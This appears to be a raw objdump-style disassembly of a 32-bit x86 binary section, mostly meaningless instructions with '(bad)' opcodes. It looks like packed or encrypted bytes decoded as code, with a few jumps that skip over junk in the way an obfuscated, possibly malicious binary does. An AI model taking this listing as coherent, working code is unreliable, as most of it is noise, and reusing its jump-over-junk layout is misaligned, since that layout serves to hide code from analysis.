  402135:	cmp    eax,0xd645f873
  40213a:	mov    ebp,0x21f01fd2
  40213f:	leave  
  402140:	mov    eax,0x6595e8b5
  402145:	(bad)  [edx+0x32]
  402148:	inc    esp
  402149:	test   BYTE PTR [eax-0x22],0x12
  40214d:	or     BYTE PTR ds:0x86154ea4,al
  402153:	test   eax,0xd6986c61
  402158:	imul   ebx,DWORD PTR [ebx-0x532ab5da],0x5093a0d1
  402162:	sbb    bl,bl
  402164:	inc    esp
  402165:	iret   
  402166:	stos   BYTE PTR es:[edi],al
  402167:	and    eax,0x2cb31d32
  40216c:	cwde   
  40216d:	ds jb  0x2aa3a52e
  402174:	fiadd  DWORD PTR [ebx+0x76]
  402177:	add    dl,BYTE PTR [edi-0x2be0db07]
  40217d:	fucomip st,st(7)
  40217f:	bound  eax,QWORD PTR [esi]
  402181:	retf   
  402182:	mov    edi,0x62f8d8a4
  402187:	aad    0x77
  402189:	test   al,0x78
  40218b:	scas   eax,DWORD PTR es:[edi]
  40218c:	sbb    eax,0x7a0b974d
  402191:	adc    esp,esp
  402193:	lahf   
  402194:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434449
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4326f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	adc    al,0x61
  4021bc:	xchg   ebx,eax
  4021bd:	sbb    DWORD PTR [edx+0x4],edx
  4021c0:	jo     0x402232
  4021c2:	xchg   edi,eax
  4021c3:	jge    0x402235
  4021c5:	jo     0x402218
  4021c7:	mov    BYTE PTR [esp+eiz*8],bh
  4021ca:	pop    ss
  4021cb:	xchg   bh,ch
  4021cd:	add    DWORD PTR [edx],esp
  4021cf:	or     ch,BYTE PTR [ebp+eiz*1+0x22e2cd0c]
  4021d6:	out    dx,eax
  4021d7:	pop    esp
  4021d8:	outs   dx,DWORD PTR ds:[esi]
  4021d9:	jnp    0x4021d1
  4021db:	fst    QWORD PTR [ebx-0x95f1a14]
  4021e1:	cdq    
  4021e2:	mov    BYTE PTR [esi+edx*2+0x1e5e24b8],ch
  4021e9:	mov    bh,0x74
  4021eb:	mov    ch,0x33
  4021ed:	inc    ebx
  4021ee:	adc    DWORD PTR [edx-0x3e],esp
  4021f1:	(bad)  
  4021f2:	sahf   
  4021f3:	cli    
  4021f4:	add    BYTE PTR [ecx-0x11],ch
  4021f7:	repz push cs
  4021f9:	push   es
  4021fa:	rcl    DWORD PTR [edi-0x59a441d2],0x7e
  402201:	lods   al,BYTE PTR ds:[esi]
  402202:	pop    ebx
  402203:	jne    0x402222
  402205:	mov    eax,ds:0xcfcb5596
  40220a:	mov    ds:0xe4a569b8,al
  40220f:	pop    ds
  402210:	in     eax,dx
  402211:	adc    ch,dl
  402213:	imul   edx,ebx,0x609bda1c
  402219:	cmc    
  40221a:	mov    ebp,0x38757a14
  40221f:	sbb    al,0x12
  402221:	or     al,0x56
  402223:	inc    edx
  402224:	int    0xca
  402226:	sub    edi,DWORD PTR [eax+eiz*2-0x51]
  40222a:	xor    BYTE PTR [edx],dh
  40222c:	jmp    0xe45f2eef
  402231:	enter  0xf40,0xe3
  402235:	ins    BYTE PTR es:[edi],dx
  402236:	sub    DWORD PTR [edi+ebp*1-0x3fdb5737],esp
  40223d:	xchg   esp,eax
  40223e:	(bad)  
  40223f:	dec    ecx
  402240:	test   DWORD PTR [ecx],ebx
  402242:	pop    edx
  402243:	scas   eax,DWORD PTR es:[edi]
  402244:	and    al,0x5d
  402246:	xchg   edx,eax
  402247:	sub    ch,ah
  402249:	sbb    ebx,DWORD PTR [ecx-0x63f97949]
  40224f:	push   0x0
  402251:	push   edx
  402252:	push   ss
  402253:	jno    0x402223
  402255:	mov    bh,0x68
  402257:	push   ds
  402258:	test   al,0x6c
  40225a:	hlt    
  40225b:	mov    al,ds:0x2a6355dd
  402260:	clc    
  402261:	ret    0xad
  402264:	aam    0xb1
  402266:	dec    ebx
  402267:	outs   dx,DWORD PTR ds:[esi]
  402268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402269:	lea    edi,[ebx+0x29]
  40226c:	sub    BYTE PTR [ebp-0x2a1b4a0c],cl
  402272:	xlat   BYTE PTR ds:[ebx]
  402273:	loope  0x40221d
  402275:	push   ss
  402276:	and    al,0x72
  402278:	sti    
  402279:	push   edx
  40227a:	add    eax,ebp
  40227c:	lods   al,BYTE PTR ds:[esi]
  40227d:	jns    0x402283
  40227f:	xchg   esp,eax
  402280:	scas   eax,DWORD PTR es:[edi]
  402281:	and    DWORD PTR [ebx+0x5f],esi
  402284:	adc    DWORD PTR [ebp-0x2456a737],edx
  40228a:	add    al,0x4e
  40228c:	pop    ebp
  40228d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40228f:	xor    esi,DWORD PTR [esi+0x7f84531c]
  402295:	jp     0x402300
  402297:	or     al,0x8f
  402299:	ret    
  40229a:	cmc    
  40229b:	outs   dx,DWORD PTR ds:[esi]
  40229c:	sbb    al,0xf7
  40229e:	cmp    BYTE PTR [ebx-0x5e4ba31a],al
  4022a4:	sub    eax,0x2c719d47
  4022a9:	jecxz  0x4022d6
  4022ab:	dec    esp
  4022ac:	aaa    
  4022ad:	cli    
  4022ae:	mov    bh,0x4f
  4022b0:	mov    ah,0xb0
  4022b2:	adc    eax,ebx
  4022b4:	ror    DWORD PTR [ecx+0xb],cl
  4022b7:	mov    dh,0x8f
  4022b9:	popa   
  4022ba:	in     al,dx
  4022bb:	mov    ds:0x58bfe15c,al
  4022c0:	imul   edi,DWORD PTR ds:0x8da6b1e2,0xffffff95
  4022c7:	mov    al,0x44
  4022c9:	push   cs
  4022ca:	(bad)  [ecx+0x2250824c]
  4022d0:	ins    DWORD PTR es:[edi],dx
  4022d1:	add    eax,0x85a1e6e8
  4022d6:	das    
  4022d7:	mov    bl,BYTE PTR [ecx]
  4022d9:	or     eax,0xba3aa1d9
  4022de:	cld    
  4022df:	dec    ebp
  4022e0:	cmp    DWORD PTR [ecx],ebp
  4022e2:	aad    0x36
  4022e4:	xchg   ebx,eax
  4022e5:	or     bh,al
  4022e7:	mov    ebp,0xd2e65da7
  4022ec:	jnp    0x40231e
  4022ee:	xchg   esp,eax
  4022ef:	jae    0x40229c
  4022f1:	xchg   ebp,esi
  4022f3:	or     edi,edx
  4022f5:	jmp    0x84bf:0x4f8fbf4c
  4022fc:	das    
  4022fd:	retf   
  4022fe:	aas    
  4022ff:	sbb    edi,edi
  402301:	retf   0x831e
  402304:	dec    ecx
  402305:	sbb    ah,BYTE PTR [ebx]
  402307:	imul   esi,DWORD PTR [eiz*2+0x406f62a7],0xffffff8d
  40230f:	push   edx
  402310:	adc    al,0xf3
  402312:	mov    esi,0x97cb06f3
  402317:	ja     0x4022b9
  402319:	loopne 0x4022f9
  40231b:	xchg   esi,eax
  40231c:	dec    eax
  40231d:	dec    ebp
  40231e:	or     dl,BYTE PTR [edx-0x128feeef]
  402324:	mov    ebx,0x372564f3
  402329:	loope  0x4022f1
  40232b:	pop    edx
  40232c:	in     al,dx
  40232d:	xchg   edi,eax
  40232e:	jbe    0x4023a6
  402330:	es into 
  402332:	xchg   esi,eax
  402333:	mov    bl,0x5f
  402335:	pop    edi
  402336:	mov    al,ds:0x74aba9f9
  40233b:	cmc    
  40233c:	aaa    
  40233d:	outs   dx,BYTE PTR ds:[esi]
  40233e:	fisttp WORD PTR [ecx+0x48]
  402341:	jl     0x402309
  402343:	xchg   ebx,eax
  402344:	push   ecx
  402345:	out    dx,al
  402346:	and    al,0xb7
  402348:	retf   0x474b
  40234b:	(bad)  
  40234c:	pop    ss
  40234d:	mov    edi,0x422d59a0
  402352:	pusha  
  402353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402354:	sahf   
  402355:	jp     0x402361
  402357:	test   eax,0x1034754
  40235c:	pop    edx
  40235d:	sbb    al,0xbe
  40235f:	mov    eax,edx
  402361:	js     0x40236d
  402363:	xchg   ebp,eax
  402364:	fidivr DWORD PTR [ebx]
  402366:	les    esp,FWORD PTR [esi+ebx*2]
  402369:	clc    
  40236a:	int    0x6a
  40236c:	or     BYTE PTR [edx+eiz*8-0x7951f77d],dl
  402373:	pop    ss
  402374:	jno    0x402347
  402376:	sahf   
  402377:	jno    0x4023ae
  402379:	inc    ecx
  40237a:	add    dl,dh
  40237c:	aaa    
  40237d:	cmp    BYTE PTR [ecx-0x38],ah
  402380:	jle    0x402395
  402382:	mov    ebx,0x642343d9
  402387:	sbb    DWORD PTR [esi+0x8],edx
  40238a:	cli    
  40238b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40238c:	stos   BYTE PTR es:[edi],al
  40238d:	pop    es
  40238e:	xor    ecx,DWORD PTR [edx+eax*2+0x1d]
  402392:	test   eax,0x9f407965
  402397:	jae    0x40239d
  402399:	sub    DWORD PTR [eax+0x4d],ebp
  40239c:	xor    eax,0xd8420929
  4023a1:	stos   BYTE PTR es:[edi],al
  4023a2:	loope  0x40240f
  4023a4:	test   DWORD PTR [esi],ebx
  4023a6:	inc    eax
  4023a7:	xor    esi,DWORD PTR [eax+0x7b10bd5c]
  4023ad:	and    eax,0x86ed5d15
  4023b2:	addr16 jp 0x402424
  4023b5:	mov    ebx,0x37b48149
  4023ba:	xchg   esp,eax
  4023bb:	fsubp  st(2),st
  4023bd:	dec    esp
  4023be:	xor    BYTE PTR [ebx+0x41],al
  4023c1:	call   0xf6417d93
  4023c6:	pop    esp
  4023c7:	xchg   ebp,eax
  4023c8:	jl     0x4023fb
  4023ca:	pop    es
  4023cb:	lea    ebx,[esi-0x1d30b8e5]
  4023d1:	pop    esp
  4023d2:	pop    DWORD PTR [esi-0x1a05f509]
  4023d8:	mov    ch,0xb
  4023da:	sub    eax,0xf766db37
  4023df:	or     BYTE PTR [edi-0x34],al
  4023e2:	ins    BYTE PTR es:[edi],dx
  4023e3:	dec    ebp
  4023e4:	shl    dh,cl
  4023e6:	push   ecx
  4023e7:	dec    eax
  4023e8:	cmp    DWORD PTR [eax+0x4a],edx
  4023eb:	mov    esi,0x50ac0995
  4023f0:	push   ebp
  4023f1:	(bad)  
  4023f2:	mov    eax,DWORD PTR [eax+0x3f]
  4023f5:	push   ss
  4023f6:	mov    edx,0x7d6598c9
  4023fb:	iret   
  4023fc:	sbb    al,0x90
  4023fe:	pop    edi
  4023ff:	loope  0x402425
  402401:	into   
  402402:	(bad)  
  402404:	rol    BYTE PTR [ecx+0x13],0xf
  402408:	int    0xaa
  40240a:	sbb    edx,DWORD PTR [edi]
  40240c:	sahf   
  40240d:	iret   
  40240e:	mov    ebp,0x9f6c3abd
  402413:	cdq    
  402414:	inc    edi
  402415:	push   0x74
  402417:	mov    eax,0xeb866d24
  40241c:	cmp    ebx,DWORD PTR [ecx+0x79cf9401]
  402422:	(bad)  [esi-0x29]
  402425:	mov    ebx,0xac0ce236
  40242a:	aaa    
  40242b:	ficom  DWORD PTR [edx+0x79720063]
  402431:	sti    
  402432:	test   cl,ch
  402434:	enter  0x3b4f,0x27
  402438:	mov    bl,0x5b
  40243a:	mov    ds:0xb2c5c7cc,eax
  40243f:	xchg   ecx,eax
  402440:	dec    eax
  402441:	sbb    BYTE PTR [ecx],cl
  402443:	xor    al,0xee
  402445:	bound  ebp,QWORD PTR [edi+ebx*2+0x2f]
  402449:	add    eax,0x6b699c29
  40244e:	or     al,0x7d
  402450:	js     0x402471
  402452:	dec    eax
  402453:	pop    ebp
  402454:	mov    al,ds:0xca492b39
  402459:	outs   dx,BYTE PTR ds:[esi]
  40245a:	sbb    esi,edi
  40245c:	pop    edx
  40245d:	jno    0x402407
  40245f:	popf   
  402460:	(bad)  
  402462:	or     BYTE PTR [ebx],al
  402464:	es jns 0x4024ba
  402467:	mov    esi,ds
  402469:	mov    esp,0xed44d568
  40246e:	sar    BYTE PTR [ecx-0x61],0x68
  402472:	add    eax,0xbf42880f
  402477:	xor    al,0x92
  402479:	jo     0x40248b
  40247b:	push   cs
  40247c:	in     al,dx
  40247d:	and    eax,0xf9e3dec8
  402482:	and    ch,bh
  402484:	(bad)  
  402485:	out    0x4b,eax
  402487:	xchg   ecx,eax
  402488:	int    0x33
  40248a:	inc    ebx
  40248b:	inc    edx
  40248c:	jo     0x402422
  40248e:	jnp    0x402431
  402490:	jle    0x40244b
  402492:	(bad)
  402495:	stos   DWORD PTR es:[edi],eax
  402496:	jnp    0x402451
  402498:	in     eax,0x28
  40249a:	mov    bh,BYTE PTR [edx+0x49]
  40249d:	cmp    eax,0xfd613b77
  4024a2:	mov    al,BYTE PTR [esi-0x482b9fe9]
  4024a8:	push   es
  4024a9:	adc    BYTE PTR [edi-0x3],bh
  4024ac:	xchg   esi,esi
  4024ae:	sub    ch,BYTE PTR [ecx+0x22]
  4024b1:	(bad)  
  4024b2:	mov    dl,0x5c
  4024b4:	jbe    0x40249b
  4024b6:	jmp    0x91d2:0x9bcaa9ab
  4024bd:	sub    eax,0x30bd6a8c
  4024c2:	dec    edx
  4024c3:	leave  
  4024c4:	ins    DWORD PTR es:[edi],dx
  4024c5:	sbb    dh,bl
  4024c7:	cmp    eax,0xda365edc
  4024cc:	adc    eax,0xff0b4a0e
  4024d1:	add    dh,al
  4024d3:	stos   BYTE PTR es:[edi],al
  4024d4:	pop    esi
  4024d5:	add    al,0x74
  4024d7:	jg     0x402536
  4024d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024da:	cmc    
  4024db:	add    DWORD PTR [esp+esi*4+0x28],0x107a62ad
  4024e3:	dec    edi
  4024e4:	and    BYTE PTR [edx],0xb5
  4024e7:	das    
  4024e8:	and    esi,DWORD PTR [esi-0x7e2136fc]
  4024ee:	sbb    bh,bl
  4024f0:	cld    
  4024f1:	pop    ss
  4024f2:	sbb    eax,0x94b3d5c7
  4024f7:	push   esi
  4024f8:	and    BYTE PTR [ecx+ebp*2-0x2c],ch
  4024fc:	outs   dx,DWORD PTR ds:[esi]
  4024fd:	add    dh,BYTE PTR [edi]
  4024ff:	mov    al,ds:0x21d9645b
  402504:	in     al,dx
  402505:	dec    ecx
  402506:	jmp    0x38902917
  40250b:	mov    ecx,0x2f85d46e
  402510:	loope  0x4024be
  402512:	or     DWORD PTR [ebx+0x2d],esp
  402515:	xchg   ebp,eax
  402516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402517:	stos   BYTE PTR es:[edi],al
  402518:	xor    ebx,DWORD PTR [eax-0x64a045aa]
  40251e:	mov    eax,0x3c1120a4
  402523:	mov    dl,ah
  402525:	pop    edx
  402526:	push   edx
  402527:	aas    
  402528:	add    eax,0x35b88b77
  40252d:	movlps QWORD PTR [ebp+0x2a],xmm6
  402531:	and    eax,0xad44cec6
  402536:	imul   ecx,DWORD PTR [esp+eiz*4-0x1b],0x5d
  40253b:	push   edx
  40253c:	out    dx,al
  40253d:	adc    al,0x6b
  40253f:	test   bh,ch
  402541:	arpl   bp,dx
  402543:	scas   al,BYTE PTR es:[edi]
  402544:	aaa    
  402545:	or     eax,0x2c3adaf2
  40254a:	dec    ebp
  40254b:	mov    ebx,DWORD PTR [ebx]
  40254d:	(bad)  
  40254e:	adc    BYTE PTR [ebp-0x7e18c384],bh
  402554:	retf   0xce44
  402557:	leave  
  402558:	repnz enter 0xc2d1,0x10
  40255d:	add    esp,DWORD PTR [ebx+ecx*4+0x55]
  402561:	clc    
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4326f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432dd2,0x4326f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	adc    al,0x8f
  4025a4:	in     al,0x6d
  4025a6:	jmp    0x97b095ab
  4025ab:	jge    0x40261d
  4025ad:	jo     0x402533
  4025af:	pusha  
  4025b0:	scas   al,BYTE PTR es:[edi]
  4025b1:	lods   eax,DWORD PTR ds:[esi]
  4025b2:	outs   dx,BYTE PTR ds:[esi]
  4025b3:	xchg   ebp,eax
  4025b4:	cli    
  4025b5:	pushf  
  4025b6:	jbe    0x4025dd
  4025b8:	xor    dh,dl
  4025ba:	xchg   DWORD PTR [ecx+0x41],edx
  4025bd:	xor    BYTE PTR [eax],bh
  4025bf:	mov    BYTE PTR [esp+esi*8],ch
  4025c2:	add    al,0xee
  4025c4:	xchg   ecx,eax
  4025c5:	jmp    0x4025bd
  4025c7:	repz loope 0x40256a
  4025ca:	shl    DWORD PTR [ebx-0x49cae11f],1
  4025d0:	popf   
  4025d1:	push   ss
  4025d2:	sub    BYTE PTR [eax+0x3a],bl
  4025d5:	stos   DWORD PTR es:[edi],eax
  4025d6:	mov    bl,0x1d
  4025d8:	inc    eax
  4025d9:	retf   0xe3e9
  4025dc:	fisubr DWORD PTR [ecx+0x1d1f42d6]
  4025e2:	lods   eax,DWORD PTR ds:[esi]
  4025e3:	fisttp DWORD PTR [ebx]
  4025e5:	clc    
  4025e6:	lods   eax,DWORD PTR ds:[esi]
  4025e7:	lods   eax,DWORD PTR ds:[esi]
  4025e8:	xor    eax,0xf6c3006e
  4025ed:	test   dh,ch
  4025ef:	mov    edx,0x252934ef
  4025f4:	fild   WORD PTR [ecx-0x44]
  4025f7:	arpl   WORD PTR [esi+ebx*8+0x4],bp
  4025fb:	sti    
  4025fc:	sub    ebp,ebx
  4025fe:	lds    eax,FWORD PTR [ebx+ebx*4]
  402601:	add    al,0xdd
  402603:	sbb    al,0x52
  402605:	(bad)  
  402606:	pushf  
  402607:	push   edi
  402608:	sub    al,0xdb
  40260a:	outs   dx,BYTE PTR ds:[esi]
  40260b:	jle    0x402674
  40260d:	jnp    0x402685
  40260f:	sahf   
  402610:	push   ds
  402611:	popa   
  402612:	inc    eax
  402613:	jmp    0x40261d
  402615:	cld    
  402616:	xlat   BYTE PTR ds:[ebx]
  402617:	adc    BYTE PTR [eax-0x37797d64],ch
  40261d:	dec    edi
  40261e:	push   eax
  40261f:	lea    eax,[esi+eax*4-0x7c]
  402623:	loopne 0x4025c2
  402625:	sahf   
  402626:	cmp    bh,BYTE PTR [esi-0x6d2972b0]
  40262c:	xor    cl,dl
  40262e:	lds    ebx,FWORD PTR [edi-0x587b8c6e]
  402634:	mov    DWORD PTR [eax+ebp*1-0x626fb39c],ecx
  40263b:	jmp    0x40268c
  40263d:	pop    esi
  40263e:	lods   al,BYTE PTR ds:[esi]
  40263f:	loope  0x40268c
  402641:	sbb    cl,bh
  402643:	mov    bl,0x3d
  402645:	pushf  
  402646:	imul   esp,DWORD PTR [ecx],0x60f922fe
  40264c:	mov    esi,0x55396982
  402651:	cmp    edx,DWORD PTR [ebx]
  402653:	sbb    BYTE PTR [edx],cl
  402655:	sub    BYTE PTR [edi+ecx*2+0x3b1d3a9],cl
  40265c:	xor    BYTE PTR [ebx+ebp*2+0xdd59451],0xc0
  402664:	cdq    
  402665:	fld    TBYTE PTR [edx+edx*4-0x4e]
  402669:	pushf  
  40266a:	and    dl,BYTE PTR [esi]
  40266c:	cdq    
  40266d:	cmp    DWORD PTR [ebp-0x31],0xffffffe2
  402671:	inc    eax
  402672:	and    eax,0x350e2f87
  402677:	cmp    ebp,DWORD PTR [esp+ebp*4+0x898d1ae]
  40267e:	push   eax
  40267f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402680:	sbb    edi,DWORD PTR [ebx]
  402682:	int3   
  402683:	gs dec ebp
  402685:	scas   eax,DWORD PTR es:[edi]
  402686:	sbb    cl,BYTE PTR [eax-0x22]
  402689:	cmp    DWORD PTR [edx],esp
  40268b:	adc    ebp,DWORD PTR ds:0x84c0c79f
  402691:	jns    0x4026ce
  402693:	xchg   ebp,eax
  402694:	dec    BYTE PTR ss:[edx-0x5268f219]
  40269b:	jmp    0x4026ca
  40269d:	adc    DWORD PTR [ecx],ebp
  40269f:	push   edx
  4026a0:	inc    esi
  4026a1:	xor    al,0xbd
  4026a3:	and    al,0x5f
  4026a5:	por    mm7,QWORD PTR [ecx]
  4026a8:	in     al,dx
  4026a9:	add    cl,ah
  4026ab:	jbe    0x402700
  4026ad:	(bad)  [edi+0x29c09b2b]
  4026b3:	jns    0x4026a4
  4026b5:	jae    0x4026a2
  4026b7:	fsubr  QWORD PTR [ecx+esi*8]
  4026ba:	xor    edi,esp
  4026bc:	cmp    BYTE PTR [edi+edi*8],ch
  4026bf:	in     eax,dx
  4026c0:	mov    dl,0xf4
  4026c2:	(bad)  
  4026c3:	xor    cl,BYTE PTR [edx+0x74]
  4026c6:	pop    edi
  4026c7:	out    0x43,al
  4026c9:	inc    ebx
  4026ca:	(bad)  
  4026cc:	fisubr DWORD PTR [ecx-0x5f18eace]
  4026d2:	mov    al,0xe6
  4026d4:	imul   edx,DWORD PTR [edi],0xc69e4689
  4026da:	imul   ebp,DWORD PTR [ecx+0x35327d7f],0x31
  4026e1:	int    0xff
  4026e3:	imul   BYTE PTR [edi]
  4026e5:	adc    cl,cl
  4026e7:	arpl   WORD PTR [ecx],cx
  4026e9:	or     cl,BYTE PTR [eax+0x4b]
  4026ec:	fbstp  TBYTE PTR [esi+0x7c]
  4026ef:	jp     0x402754
  4026f1:	push   0xffffffd7
  4026f3:	in     eax,dx
  4026f4:	mov    DWORD PTR [esi+0x40c70984],eax
  4026fa:	mov    ch,0x18
  4026fc:	fdivr  QWORD PTR [ebp+ecx*4-0x14f67b7e]
  402703:	mov    ebx,0xa477bd9a
  402708:	and    ah,BYTE PTR [bx-0x51]
  40270c:	jne    0x402751
  40270e:	pop    ds
  40270f:	lock aam 0xfd
  402712:	jge    0x40273d
  402714:	cmp    ebx,DWORD PTR ss:[edx-0x25]
  402718:	cmc    
  402719:	cmp    ebp,edx
  40271b:	add    bl,ch
  40271d:	and    BYTE PTR [ecx-0x7a],dh
  402720:	adc    al,dh
  402722:	jl     0x4026c8
  402724:	xchg   edx,eax
  402725:	sbb    al,0xbc
  402727:	imul   edi,DWORD PTR [esi+0xca3374b],0x1
  40272e:	inc    esp
  40272f:	pop    ebp
  402730:	(bad)  
  402731:	push   edx
  402732:	mov    ch,0xf
  402734:	adc    DWORD PTR [esp+edi*4-0x247fcdd1],ebp
  40273b:	mov    eax,0xf71d483b
  402740:	stc    
  402741:	stos   DWORD PTR es:[edi],eax
  402742:	jmp    0x9283:0xf39679e5
  402749:	int3   
  40274a:	push   esp
  40274b:	call   FWORD PTR [ecx]
  40274d:	cmp    esp,edi
  40274f:	and    BYTE PTR [edx-0x426be79],dl
  402755:	test   DWORD PTR [esi+0x2b28db2f],ebp
  40275b:	jge    0x4027da
  40275d:	xor    ecx,DWORD PTR [edx]
  40275f:	fcomp  DWORD PTR [esi+0x33]
  402762:	dec    edx
  402763:	add    DWORD PTR [edx+esi*4-0x27],edi
  402767:	inc    edx
  402768:	sub    BYTE PTR [ebp+0x3f],al
  40276b:	xchg   ebx,eax
  40276c:	mov    dh,BYTE PTR [ecx+0x23b4994]
  402772:	xchg   edi,eax
  402773:	lods   al,BYTE PTR ds:[esi]
  402774:	dec    ecx
  402775:	lods   eax,DWORD PTR ds:[esi]
  402776:	or     ah,ah
  402778:	jne    0x402779
  40277a:	add    edx,ecx
  40277c:	out    dx,al
  40277d:	imul   edx,ebx,0xf694d2ae
  402783:	stc    
  402784:	push   edi
  402785:	scas   eax,DWORD PTR es:[edi]
  402786:	out    0xe0,al
  402788:	imul   ebx,DWORD PTR ds:[eax],0xd940c289
  40278f:	fld    DWORD PTR [esi]
  402791:	and    al,dh
  402793:	xchg   ebp,eax
  402794:	jne    0x402773
  402796:	rcr    DWORD PTR [ecx+0x31],cl
  402799:	xchg   BYTE PTR [edx-0x7140eed],dh
  40279f:	or     BYTE PTR [eax+ecx*2+0x1d],ch
  4027a3:	cwde   
  4027a4:	mov    ds:0x4f646c3,al
  4027a9:	xor    eax,0x401690a7
  4027ae:	lahf   
  4027af:	outs   dx,DWORD PTR ds:[esi]
  4027b0:	and    ebp,0xffffffdc
  4027b3:	sub    DWORD PTR [ebx+eax*1-0x515fc49e],ecx
  4027ba:	nop
  4027bb:	fwait
  4027bc:	js     0x4027c6
  4027be:	das    
  4027bf:	adc    eax,esp
  4027c1:	pusha  
  4027c2:	inc    DWORD PTR [edi-0x4dcf779c]
  4027c8:	mov    DWORD PTR [ecx-0x49a84d9c],ebp
  4027ce:	rcl    eax,cl
  4027d0:	mov    ecx,0xc30c0740
  4027d5:	sbb    DWORD PTR [edx-0x41af5a13],ecx
  4027db:	sbb    DWORD PTR [edi+0x3c],ecx
  4027de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027df:	daa    
  4027e0:	jne    0x4027a3
  4027e2:	cmp    al,0x46
  4027e4:	or     ebx,DWORD PTR [edx+0x29]
  4027e7:	fnstcw WORD PTR ds:0x1e684f50
  4027ed:	pop    ss
  4027ee:	jmp    0x98a7:0x16732be9
  4027f5:	mov    ds:0x6167d4b6,al
  4027fa:	pop    ebx
  4027fb:	arpl   WORD PTR [edx],si
  4027fd:	(bad)  
  4027fe:	jp     0x402847
  402800:	hlt    
  402801:	ret    0xb6bc
  402804:	mov    bl,0xe4
  402806:	adc    BYTE PTR [ecx],al
  402808:	mov    ch,0x7c
  40280a:	push   ebx
  40280b:	mov    ebp,0xae9533f8
  402810:	sbb    BYTE PTR [ecx+0x45],dh
  402813:	std    
  402814:	push   eax
  402815:	push   0x179e17b5
  40281a:	adc    edi,DWORD PTR ss:[ebx]
  40281d:	cld    
  40281e:	mov    eax,ds:0x3ae73f79
  402823:	shr    BYTE PTR [ecx-0x12d99f02],1
  402829:	ss inc edi
  40282b:	xlat   BYTE PTR ds:[ebx]
  40282c:	push   ss
  40282d:	cwde   
  40282e:	je     0x4027f9
  402830:	mov    cl,0x9f
  402832:	jno    0x4027c3
  402834:	mov    bx,0x288b
  402838:	iret   
  402839:	add    esi,DWORD PTR [ebx-0x4ddf77b2]
  40283f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402840:	lock mov bl,0x5f
  402843:	iret   
  402844:	xor    edi,DWORD PTR [edi+0x8]
  402847:	jmp    0xbaad:0xc26b2b9d
  40284e:	xor    BYTE PTR [ecx-0x648811ea],al
  402854:	sub    al,0x29
  402856:	mov    al,ds:0x350c4984
  40285b:	add    BYTE PTR [eax],0x70
  40285e:	pop    esp
  40285f:	stos   DWORD PTR es:[edi],eax
  402860:	adc    eax,0x190cd0a8
  402865:	mov    dl,0x56
  402867:	gs sti 
  402869:	inc    edi
  40286a:	sub    dh,BYTE PTR [eax]
  40286c:	nop
  40286d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40286e:	in     al,0xfe
  402870:	push   edx
  402871:	dec    edx
  402872:	xchg   DWORD PTR [eax-0x6c],eax
  402875:	mov    DWORD PTR [eax+0x2753cad3],ebx
  40287b:	imul   esi,DWORD PTR [edi+0x18764198],0x3f3437d6
  402885:	sti    
  402886:	mov    ds:0xfeb30e0c,al
  40288b:	in     eax,dx
  40288c:	mov    cl,al
  40288e:	pop    ss
  40288f:	outs   dx,DWORD PTR ds:[esi]
  402890:	mov    eax,ds:0xd28706eb
  402895:	stos   DWORD PTR es:[edi],eax
  402896:	fcomp  DWORD PTR [ecx-0x5caa595]
  40289c:	stos   DWORD PTR es:[edi],eax
  40289d:	ror    DWORD PTR [ecx],cl
  40289f:	pop    ecx
  4028a0:	icebp  
  4028a1:	jge    0x4028b3
  4028a3:	dec    BYTE PTR [esi+0x5c]
  4028a6:	out    dx,al
  4028a7:	(bad)  
  4028a8:	cmp    ebx,DWORD PTR [eax*2+0x547d7d59]
  4028af:	test   eax,0xfb09446e
  4028b4:	xchg   ebx,eax
  4028b5:	shl    ebp,cl
  4028b7:	leave  
  4028b8:	pop    esi
  4028b9:	dec    ecx
  4028ba:	mov    eax,0x7efc6191
  4028bf:	mov    DWORD PTR [eax+ebp*8+0x65691473],edx
  4028c6:	xchg   edi,eax
  4028c7:	pop    ecx
  4028c8:	xor    edi,DWORD PTR [esp+esi*4]
  4028cb:	and    BYTE PTR [edi],cl
  4028cd:	fstp   QWORD PTR [eax-0x151742c8]
  4028d3:	cld    
  4028d4:	and    dh,BYTE PTR [ebx+eax*1+0x2e78859b]
  4028db:	inc    edi
  4028dc:	sub    BYTE PTR ss:[edx],bh
  4028df:	monitor 
  4028e2:	push   esi
  4028e3:	fnstsw WORD PTR [edi]
  4028e5:	jo     0x4028b5
  4028e7:	sbb    DWORD PTR [eax-0x5d88eed7],ebp
  4028ed:	push   ss
  4028ee:	ret    
  4028ef:	mov    al,0xb5
  4028f1:	imul   esp,DWORD PTR [ebx+0x3d],0xffffffe6
  4028f5:	(bad)  
  4028f7:	pop    esp
  4028f8:	mov    al,0xac
  4028fa:	in     al,0xa6
  4028fc:	mov    bl,0xdc
  4028fe:	pop    edi
  4028ff:	add    BYTE PTR [esi],ah
  402901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402902:	jno    0x4028b9
  402904:	loop   0x4028bc
